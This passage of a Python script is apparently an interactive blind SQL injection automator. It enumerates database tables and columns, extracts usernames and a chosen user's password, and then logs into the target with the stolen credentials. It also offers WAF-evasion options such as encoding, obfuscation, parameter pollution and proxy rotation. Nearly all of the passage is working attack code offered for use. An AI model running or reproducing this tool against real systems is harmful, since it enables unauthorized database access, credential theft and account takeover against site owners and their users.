    if not subquery_template:
        subquery_template = get_default_subquery_for_phase4()
    if "{offset}" not in subquery_template:
        if config["db_type"] == "oracle" and "ROWNUM=1" in subquery_template:
            tables = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                name = extract_string(subquery, length)
                if name:
                    tables.append(name)
                    print(f"[+] Table 0: {name}")
            return tables
        else:
            print("[!] No {offset} placeholder. Extracting first row only.")
            tables = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                name = extract_string(subquery, length)
                if name:
                    tables.append(name)
                    print(f"[+] Table 0: {name}")
            return tables
    tables = []
    offset = 0
    while True:
        subquery = subquery_template.format(offset=offset)
        length = get_length(subquery)
        if length is None or length == 0:
            print("[*] No more tables found.")
            break
        name = extract_string(subquery, length)
        if name:
            tables.append(name)
            print(f"[+] Table {offset}: {name}")
        else:
            print("[!] Empty table name, stopping.")
            break
        offset += 1
    return tables

def phase_enumerate_columns(table_name):
    print(f"\n=== Phase 5: Enumerate Columns for Table '{table_name}' ===")
    print("Provide a subquery template with {offset} placeholder.")
    print("Examples:")
    print(f"  MySQL:      SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {{offset}}")
    print(f"  PostgreSQL: SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {{offset}}")
    print(f"  MSSQL:      SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' ORDER BY column_name OFFSET {{offset}} ROWS FETCH NEXT 1 ROWS ONLY")
    print(f"  Oracle:     SELECT column_name FROM all_tab_columns WHERE table_name='{table_name.upper()}' AND ROWNUM=1")
    subquery_template = input("> ").strip()
    subquery_template = clean_subquery_input(subquery_template)
    if not subquery_template:
        if config["db_type"] == "mssql":
            subquery_template = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' ORDER BY column_name OFFSET {{offset}} ROWS FETCH NEXT 1 ROWS ONLY"
        elif config["db_type"] == "oracle":
            subquery_template = f"SELECT column_name FROM all_tab_columns WHERE table_name='{table_name.upper()}' AND ROWNUM=1"
        else:
            subquery_template = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {{offset}}"
    if "{offset}" not in subquery_template:
        if config["db_type"] == "oracle" and "ROWNUM=1" in subquery_template:
            columns = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                col = extract_string(subquery, length)
                if col:
                    columns.append(col)
                    print(f"[+] Column 0: {col}")
            return columns
        else:
            print("[!] No {offset} placeholder. Extracting first column only.")
            columns = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                col = extract_string(subquery, length)
                if col:
                    columns.append(col)
                    print(f"[+] Column 0: {col}")
            return columns
    columns = []
    offset = 0
    while True:
        subquery = subquery_template.format(offset=offset)
        length = get_length(subquery)
        if length is None or length == 0:
            break
        col = extract_string(subquery, length)
        if col:
            columns.append(col)
            print(f"[+] Column {offset}: {col}")
        else:
            break
        offset += 1
    return columns

def phase_confirm_rows_exist(table_name):
    print(f"\n=== Phase 6: Confirm Rows in Table '{table_name}' ===")
    condition = f"(SELECT COUNT(*) FROM {table_name}) > 0"
    if is_true(condition):
        print("[+] Rows exist.")
        return True
    else:
        print("[-] No rows found (or table empty).")
        return False

def phase_extract_usernames(table_name, column_name):
    print(f"\n=== Phase 7: Extract Usernames from '{table_name}.{column_name}' ===")
    print("Provide a subquery template with {offset} placeholder and optional WHERE.")
    print("Examples:")
    print(f"  MySQL:      SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {{offset}}")
    print(f"  PostgreSQL: SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {{offset}}")
    print(f"  MSSQL:      SELECT {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {{offset}} ROWS FETCH NEXT 1 ROWS ONLY")
    print(f"  Oracle:     SELECT {column_name} FROM {table_name} WHERE ROWNUM=1")
    subquery_template = input("> ").strip()
    subquery_template = clean_subquery_input(subquery_template)
    if not subquery_template:
        if config["db_type"] == "mssql":
            subquery_template = f"SELECT {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {{offset}} ROWS FETCH NEXT 1 ROWS ONLY"
        elif config["db_type"] == "oracle":
            subquery_template = f"SELECT {column_name} FROM {table_name} WHERE ROWNUM=1"
        else:
            subquery_template = f"SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {{offset}}"
    if "{offset}" not in subquery_template:
        if config["db_type"] == "oracle" and "ROWNUM=1" in subquery_template:
            usernames = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                username = extract_string(subquery, length)
                if username:
                    usernames.append(username)
                    print(f"[+] User 0: {username}")
            return usernames
        else:
            print("[!] No {offset} placeholder. Extracting first username only.")
            usernames = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                username = extract_string(subquery, length)
                if username:
                    usernames.append(username)
                    print(f"[+] User 0: {username}")
            return usernames
    usernames = []
    offset = 0
    while True:
        subquery = subquery_template.format(offset=offset)
        length = get_length(subquery)
        if length is None or length == 0:
            break
        username = extract_string(subquery, length)
        if username:
            usernames.append(username)
            print(f"[+] User {offset}: {username}")
        else:
            break
        offset += 1
    return usernames

def phase_choose_target(usernames):
    print("\n=== Phase 8: Choose Target User ===")
    if not usernames:
        print("[!] No usernames available.")
        return None
    for i, name in enumerate(usernames):
        print(f"{i}: {name}")
    idx = input("Enter index of target user: ").strip()
    try:
        idx = int(idx)
        return usernames[idx]
    except (ValueError, IndexError):
        print("[!] Invalid selection.")
        return None

def phase_extract_password(table_name, user_column, user_value, password_column):
    print(f"\n=== Phase 9/10: Extract Password for {user_column}='{user_value}' ===")
    print("Provide a subquery that returns the password for the target user.")
    print("Examples:")
    print(f"  MySQL/PostgreSQL: SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}' LIMIT 1")
    print(f"  MSSQL:           SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}'")
    print(f"  Oracle:          SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}'")
    subquery = input("> ").strip()
    subquery = clean_subquery_input(subquery)
    if not subquery:
        if config["db_type"] == "mssql":
            subquery = f"SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}'"
        elif config["db_type"] == "oracle":
            subquery = f"SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}'"
        else:
            subquery = f"SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}' LIMIT 1"
    length = get_length(subquery)
    if length is None:
        return None
    password = extract_string(subquery, length)
    print(f"[+] Password: {password}")
    return password

def phase_login(username, password):
    print("\n=== Phase 11: Login ===")
    login_url = input("Login URL (e.g., https://target/login): ").strip()
    login_data = {
        "username": username,
        "password": password,
    }
    try:
        r = session.post(login_url, data=login_data, proxies=config["proxies"],
                         headers=config["headers"], timeout=10, verify=False)
        print(f"Login response status: {r.status_code}")
        print(f"Response length: {len(r.text)}")
        print("Check if login was successful.")
    except Exception as e:
        print(f"Login request failed: {e}")

# ==============================
#  CONFIGURATION
# ==============================
def fetch_dynamic_fields():
    try:
        r = session.get(config["target_url"], proxies=config["proxies"],
                        headers=config["headers"], verify=False, timeout=10)
        for match in re.finditer(r'<input[^>]+type=["\']hidden["\'][^>]*>', r.text, re.I):
            tag = match.group(0)
            name_m = re.search(r'name=["\']([^"\']+)', tag)
            value_m = re.search(r'value=["\']([^"\']*)', tag)
            if name_m and value_m:
                config["extra_post_fields"][name_m.group(1)] = value_m.group(2)
                print(f"[+] Extracted dynamic field: {name_m.group(1)} = {value_m.group(2)}")
    except:
        pass

def configure():
    print("\n=== Configuration ===")
    print("Please answer the following questions to set up the SQL injection test.")
    print("You can press Enter to accept default values where shown in [brackets].\n")

    # 1. Target URL
    print("1. Target URL")
    print("   This is the URL of the page that will be tested.")
    print("   Example: https://example.com/page")
    print("   If the injection is in GET, do NOT include the parameter here;")
    print("   the script will add it automatically.")
    config["target_url"] = input("   Target URL: ").strip()

    # 2. Injection location
    print("\n2. Injection location")
    print("   Where is the injection point?")
    print("   - cookie : value inside a cookie")
    print("   - get    : URL query parameter")
    print("   - post   : POST body (form or JSON)")
    print("   - header : HTTP header")
    config["injection_location"] = input("   Location (cookie/get/post/header): ").strip().lower()
    while config["injection_location"] not in ["cookie", "get", "post", "header"]:
        print("   Invalid choice. Please type one of: cookie, get, post, header")
        config["injection_location"] = input("   Location: ").strip().lower()

    # 3. Parameter name
    print(f"\n3. Name of the {config['injection_location']}")
    print("   This is the exact name of the parameter / cookie / header that is vulnerable.")
    print("   Examples: 'id' for GET, 'TrackingId' for cookie, 'phone' for POST")
    config["param_name"] = input(f"   Parameter name: ").strip()

    # 4. POST-specific options
    if config["injection_location"] == "post":
        config["method"] = "POST"
        print("\n4. POST content type")
        print("   Choose 'form' if the POST body is normal HTML form data.")
        print("   Choose 'json' if the POST body is JSON (Content-Type: application/json).")
        content_type = input("   Content type (form/json, default form): ").strip().lower()
        if content_type in ["json", "form"]:
            config["post_content_type"] = content_type
        else:
            config["post_content_type"] = "form"

        print("\n5. Additional POST fields")
        print("   If the POST request includes other fields besides the injection point,")
        print("   enter them as key=value pairs separated by semicolons.")
        print("   Example: password=test; action=login")
        extra_fields_str = input("   Additional fields (blank for none): ").strip()
        if extra_fields_str:
            for pair in extra_fields_str.split(';'):
                if '=' in pair:
                    k, v = pair.strip().split('=', 1)
                    config["extra_post_fields"][k.strip()] = v.strip()

        print("\n6. Auto-extract hidden/CSRF fields?")
        print("   If you answer 'y', the script will try to get the page and find")
        print("   hidden input fields (like CSRF tokens) to include in POST requests.")
        dyn = input("   Auto-extract hidden fields? (y/n, default n): ").strip().lower()
        if dyn == 'y':
            fetch_dynamic_fields()
    else:
        # 4. HTTP method
        print("\n4. HTTP method")
        print("   Usually GET, but some endpoints use POST even for cookie/header injection.")
        config["method"] = input("   Method (GET/POST, default GET): ").strip().upper() or "GET"

    # 5. Original value
    print("\n5. Original value")
    print("   The normal value of the parameter BEFORE injection.")
    print("   Example: if the URL is ?id=123, the original value is '123'.")
    print("   If testing a cookie, it is the current cookie value.")
    config["original_value"] = input("   Original value: ").strip()

    # 6. Manual prefix/suffix
    print("\n6. Set prefix/suffix manually?")
    print("   If you already know the exact SQL syntax around the injection point,")
    print("   you can set it manually. Otherwise, the script will auto-detect it.")
    print("   Most users should answer 'n' to let the script find it.")
    manual = input("   Set manually? (y/n, default n): ").strip().lower()
    if manual == 'y':
        print("   Prefix: text placed BEFORE the condition, e.g., \"123' AND \"")
        print("   Suffix: text placed AFTER the condition, e.g., \"-- -\" or \"#\"")
        quote_needed = input("   Does the original value need a closing quote? (y/n, default y): ").strip().lower() or 'y'
        if quote_needed == 'y':
            config["prefix"] = config["original_value"] + "' AND "
        else:
            config["prefix"] = config["original_value"] + " AND "
        config["suffix"] = input("   Suffix (default '-- -'): ").strip() or "-- -"
    else:
        config["prefix"] = ""
        config["suffix"] = "-- -"

    # 7. Oracle indicator
    print("\n7. Do you know the oracle indicator?")
    print("   The oracle is how the script distinguishes TRUE from FALSE responses.")
    print("   If you don't know, answer 'n' and the script will auto-detect it.")
    oracle_choice = input("   Know oracle? (y/n, default n): ").strip().lower() or 'n'
    if oracle_choice == 'y':
        print("   Indicator type can be:")
        print("   - contains    : a string that appears only in TRUE responses")
        print("   - length_gt   : TRUE response is longer than a given length")
        print("   - length_lt   : TRUE response is shorter than a given length")
        print("   - status_code : TRUE response has a specific HTTP status code")
        print("   - header      : a specific header value indicates TRUE")
        config["indicator_type"] = input("   Indicator type (default contains): ").strip() or "contains"
        if config["indicator_type"] in ["length_gt", "length_lt", "status_code"]:
            config["indicator_value"] = input("   Value (number): ").strip()
        elif config["indicator_type"] == "header":
            config["indicator_value"] = input("   Header name: ").strip()
            config["true_indicator"] = input("   Header value for TRUE: ").strip()
        else:
            config["true_indicator"] = input("   String that appears only in TRUE responses: ").strip()
    else:
        print("   Auto-detection will be used in Phase 1.")

    # 8. Delay
    print("\n8. Delay between requests")
    print("   This is the pause after each HTTP request.")
    print("   For a fast local target, 0.1–0.3 is fine.")
    print("   For a remote target, 0.5–1.0 helps avoid rate-limiting.")
    config["delay"] = float(input("   Delay in seconds (default 0.2): ").strip() or "0.2")
    random_delay = input("   Add random jitter to delay? (y/n, default n): ").strip().lower()
    config["random_delay"] = (random_delay == 'y')

    # 9. WAF bypass options
    print("\n--- WAF Bypass Options ---")
    print("These options can help evade simple Web Application Firewalls.")
    print("For initial detection, it's recommended to leave structural options OFF.")
    print("Only enable them if you are sure the target tolerates them.")

    # Ask for WAF level
    waf_level = input("   Choose WAF bypass level (simple/advanced, default simple): ").strip().lower()
    if waf_level == "advanced":
        config["waf_level"] = "advanced"
    else:
        config["waf_level"] = "simple"

    # Simple options (always shown)
    config["debug"] = input("   Enable debug logging? (y/n, default n): ").strip().lower() == 'y'

    print("   Encoding: changes how special characters are represented.")
    print("   Options: none, url, double_url, unicode")
    enc = input("   Encoding (default none): ").strip().lower()
    config["encoding"] = enc if enc in ["url", "double_url", "unicode"] else "none"

    print("   Obfuscation mode: changes the SQL syntax to avoid simple filters.")
    print("   Options: none, comments, case, operators, parentheses, null_byte, random")
    if config["waf_level"] == "advanced":
        print("            (Advanced adds: versioned_comments, whitespace_alternatives)")
    obf = input("   Obfuscation mode (default none): ").strip().lower()
    config["obfuscation_mode"] = obf if obf in ["comments", "case", "operators", "parentheses", "null_byte", "random", "versioned_comments", "whitespace_alternatives"] else "none"

    config["parameter_pollution"] = input("   Enable parameter pollution? (y/n, default n): ").strip().lower() == 'y'
    config["content_type_switch"] = input("   Enable content-type switching for POST? (y/n, default n): ").strip().lower() == 'y'
    config["method_tampering"] = input("   Enable method tampering (random GET/POST)? (y/n, default n): ").strip().lower() == 'y'
    config["char_func_encoding"] = input("   Enable CHAR() function encoding? (y/n, default n): ").strip().lower() == 'y'
    config["hex_encoding"] = input("   Enable hex encoding? (y/n, default n): ").strip().lower() == 'y'
    config["base64_encoding"] = input("   Enable base64 encoding? (y/n, default n): ").strip().lower() == 'y'

    # Advanced options (only if advanced)
    if config["waf_level"] == "advanced":
        print("\n--- Advanced WAF Bypass Options ---")
        config["multi_layer_encoding"] = input("   Enable multi-layer encoding? (y/n, default n): ").strip().lower() == 'y'
        config["proxy_rotation"] = input("   Enable proxy rotation? (y/n, default n): ").strip().lower() == 'y'
        if config["proxy_rotation"]:
            proxy_str = input("   Proxy list (separate multiple with semicolons): ").strip()
            config["proxy_list"] = [p.strip() for p in proxy_str.split(';') if p.strip()]
        else:
            config["proxy_list"] = []
        config["advanced_obfuscation"] = input("   Enable advanced obfuscation methods? (y/n, default n): ").strip().lower() == 'y'
        config["dynamic_delay"] = input("   Enable dynamic delay increase? (y/n, default n): ").strip().lower() == 'y'

    # 10. Concurrency
    print("\n10. Concurrency")
    print("    Number of parallel requests during auto-detection.")
    print("    Higher speeds up detection but may overwhelm the target or WAF.")
    print("    For reliable results, 1–3 is often best.")
    conc = input("    Concurrency (default 5): ").strip()
    if conc.isdigit():
        config["concurrency"] = int(conc)
    else:
        config["concurrency"] = 5

    # 11. Proxy (single proxy for simple mode)
    print("\n11. Proxy")
    print("    If you use a proxy like Burp, enter its address.")
    print("    Example: http://127.0.0.1:8080")
    proxies = input("    Proxy (blank for none): ").strip()
    if proxies:
        config["proxies"] = {"http": proxies, "https": proxies}

    # 12. Additional cookies
    print("\n12. Additional cookies")
    print("    If the target requires session cookies, paste them here.")
    print("    Format: key=value; key2=value2")
    cookie_str = input("    Cookies (blank for none): ").strip()
    if cookie_str:
        for pair in cookie_str.split(';'):
            if '=' in pair:
                k, v = pair.strip().split('=', 1)
                config["cookies"][k.strip()] = v.strip()
                session.cookies.set(k.strip(), v.strip())

    # 13. Extra headers
    print("\n13. Extra headers")
    print("    If you need to add headers like Referer or X-Forwarded-For,")
    print("    enter them as: Key:Value; Key2:Value2")
    header_str = input("    Headers (blank for none): ").strip()
    if header_str:
        for pair in header_str.split(';'):
            if ':' in pair:
                k, v = pair.strip().split(':', 1)
                config["headers"][k.strip()] = v.strip()

    # 14. Database type
    print("\n14. Database type")
    print("    If you already know the DBMS, select it to speed up extraction.")
    print("    Options: mysql, postgresql, mssql, oracle")
    db_choice = input("    Database (blank to auto-detect later): ").strip().lower()
    if db_choice in ["mysql", "postgresql", "mssql", "oracle"]:
        config["db_type"] = db_choice

    # 15. Auto-detection toggle
    print("\n15. Run auto-detection in Phase 1?")
    print("    If 'y', the script will try many injection syntaxes automatically.")
    print("    If 'n', you must provide a valid prefix/suffix and oracle manually.")
    auto_detect_choice = input("    Auto-detect? (y/n, default y): ").strip().lower()
    if auto_detect_choice == 'n':
        config["auto_detect"] = False
    else:
        config["auto_detect"] = True

    # Final validation
    if not config["target_url"] or not config["param_name"] or not config["original_value"]:
        print("[!] Missing required fields (target_url, param_name, original_value).")
        return False
    print("\n[+] Configuration saved. You can now run Phase 1 (Option 2).")
    return True

# ==============================
#  MAIN MENU
# ==============================
def main_menu():
    while True:
        print("\n" + "="*50)
        print("Blind SQLi Interactive Automator (Fully Loaded + Concurrent + Sensitive)")
        print("="*50)
        print("1. Configure injection / oracle")
        print("2. Phase 1: Confirm blind SQLi")
        print("3. Phase 2: Identify database")
        print("4. Phase 3: Confirm table exists")
        print("5. Phase 4: Enumerate tables")
        print("6. Phase 5: Enumerate columns")
        print("7. Phase 6: Confirm rows exist")
        print("8. Phase 7: Extract usernames")
        print("9. Phase 8: Choose target user")
        print("10. Phase 9-10: Extract password")
        print("11. Phase 11: Login")
        print("0. Exit")
        choice = input("\nEnter choice: ").strip()
        if choice == "1":
            configure()
        elif choice == "2":
            phase_confirm_injection()
        elif choice == "3":
            phase_identify_database()
        elif choice == "4":
            table = input("Table name to check: ").strip()
            phase_confirm_table_exists(table)
        elif choice == "5":
            tables = phase_enumerate_tables()
            print("Tables found:", tables)
        elif choice == "6":
            table = input("Table name: ").strip()
            cols = phase_enumerate_columns(table)
            print("Columns found:", cols)
        elif choice == "7":
            table = input("Table name: ").strip()
            phase_confirm_rows_exist(table)
        elif choice == "8":
            table = input("Table name: ").strip()
            col = input("Column to extract (e.g., username): ").strip()
            users = phase_extract_usernames(table, col)
            print("Usernames found:", users)
            global last_usernames
            last_usernames = users
        elif choice == "9":
            if not last_usernames:
                print("[!] No usernames extracted yet. Run phase 7 first.")
            else:
                target = phase_choose_target(last_usernames)
                if target:
                    global target_user
                    target_user = target
                    print(f"[+] Target user set to: {target}")
        elif choice == "10":
            if not target_user:
                print("[!] No target user selected. Run phase 8 first.")
                continue
            table = input("Table name: ").strip()
            user_col = input("Username column name: ").strip()
            pass_col = input("Password column name: ").strip()
            password = phase_extract_password(table, user_col, target_user, pass_col)
            if password:
                global extracted_password
                extracted_password = password
        elif choice == "11":
            if not target_user or not extracted_password:
                print("[!] Need target user and password first.")
            else:
                phase_login(target_user, extracted_password)
        elif choice == "0":
            print("Exiting.")
            sys.exit(0)
        else:
            print("Invalid choice.")

if __name__ == "__main__":
    print("="*50)
    print("Blind SQLi Interactive Automator (Fully Loaded + Concurrent + Sensitive)")
    print("Flexible for any injection location and multiple DBMS")
    print("="*50)
    print("Start by configuring (option 1).")
    main_menu()
